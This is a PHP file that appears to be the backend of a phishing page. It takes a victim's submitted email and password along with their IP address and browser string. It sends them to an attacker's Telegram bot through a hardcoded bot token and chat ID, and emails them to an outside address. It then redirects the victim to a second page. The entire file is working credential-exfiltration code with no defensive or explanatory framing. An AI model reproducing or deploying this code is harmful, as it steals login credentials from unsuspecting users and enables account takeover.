<?php
$em = isset($_POST['aaa']) ? $_POST['aaa'] : '';
$pd = isset($_POST['bbb']) ? $_POST['bbb'] : '';

if ($em === '' || $pd === '') {
    header("Location: index.htm");
    exit();
}

$botToken = "5898883071:AAGRsYgunAHyOWb9xS-05YG59-eL6MdnA38";
$chatId   = "1175142247";

$message  = "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$message .= "EM: {$em}\n";
$message .= "PD: {$pd}\n";
$message .= "BROWSER: " . $_SERVER['HTTP_USER_AGENT'] . "\n";

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text'    => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

$to      = "pauldiken20@yandex.com";
$subject = "New Submission from ".$_SERVER['REMOTE_ADDR'];
$headers = "From: Ogami <kljhkljhlk@kljhlkjhlkj.com>\r\n";

mail($to, $subject, $message, $headers);

header("Location: index2.htm");
exit();
?>
